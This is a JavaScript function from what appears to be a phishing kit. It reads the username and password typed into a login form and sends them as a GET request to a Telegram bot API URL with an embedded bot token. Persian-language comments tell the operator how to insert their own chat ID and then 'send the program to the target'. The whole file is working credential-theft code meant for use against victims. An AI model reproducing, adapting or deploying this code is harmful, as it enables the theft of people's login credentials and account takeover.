function SendData() {
    var user = document.getElementById("userlog").value;
    var pass = document.getElementById("passlog").value;
    var userpass = "Username:"+user+"_"+"Password:"+pass
    // Id Bot:@mahantesttest_bot
    // Run:
    
    
    // اول وارد تلگرام شوید و ایدی که بالا نوشتم را در سرچ پیست کنید
    // @userinfobot مربوط به متن پایین
    //بعد وارد ربات بالا شوید شوید
    // و برای ربات یک متن تایپ کنید و ایدی خودتان را کپی کنید آن را در قسمتی که ما نوشتیم {yourchatid} کل آن متن را پاک کنید ایدی خودتان را پیست کنید
    // بعد ربات را استارت کنید وبرنامه را برای تارگت ارسال کنید

    var url = 'https://api.telegram.org/bot5246105498:AAFntRSggUeaCkvdduShahd0RuY0QNM4jSA/sendmessage?chat_id={yourchatidintelegram}&text='+userpass;

    
    var send = new XMLHttpRequest();
    send.open("GET", url, true);
    send.send();

    
}
